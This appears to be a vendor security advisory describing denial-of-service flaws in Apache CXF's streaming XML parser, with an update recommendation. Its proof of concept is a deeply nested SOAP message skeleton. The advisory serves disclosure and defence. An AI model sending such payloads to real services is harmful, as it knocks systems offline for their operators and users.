Vendor/product description:
------------------------------------------------------------------------------
"Apache CXF is an open source services framework. CXF helps you build and
develop services using frontend programming APIs, like JAX-WS and JAX-RS.
These services can speak a variety of protocols such as SOAP, XML/HTTP,
RESTful HTTP, or CORBA and work over a variety of transports such as HTTP,
JMS or JBI."

Business recommendation:
------------------------------------------------------------------------------
Various denial of service attack vectors were found within Apache CXF.
The recommendation of SEC Consult is to immediately perform an update.



Vulnerability overview/description:
------------------------------------------------------------------------------
It is possible to execute Denial of Service attacks on Apache CXF, exploiting
the fact that the streaming XML parser does not put limits on things like the
number of elements, number of attributes, the nested structure of the document
received, etc. The effects of these attacks can vary from causing high CPU
usage, to causing the JVM to run out of memory.

Proof of concept:
------------------------------------------------------------------------------
The following SOAP message will trigger a denial of service:

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope";>
  <soap:Body>
        <element>
                <element>
                        <element>
                                <element>
                                        [thousands more]
                                </element>
                        </element>
                </element>
        </element>
  </soap:Body>
</soap:Envelope>

There are various other XML payloads that will also trigger a denial of
service on vulnerable services.
